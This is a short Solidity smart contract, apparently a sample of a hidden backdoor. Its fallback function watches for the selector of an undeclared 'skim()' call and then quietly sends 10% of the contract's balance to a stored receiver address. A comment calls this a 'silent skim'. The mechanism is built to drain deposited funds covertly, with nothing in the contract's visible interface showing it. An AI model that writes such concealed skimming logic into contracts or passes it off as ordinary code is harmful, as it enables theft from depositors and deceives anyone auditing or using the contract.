contract FallbackStealthTransfer {
    address payable public receiver;

    constructor(address payable _receiver) {
        receiver = _receiver;
    }

    fallback() external payable {
        if (msg.sig == bytes4(keccak256("skim()"))) {
            receiver.transfer(address(this).balance / 10); // 10% silent skim
        }
    }
}
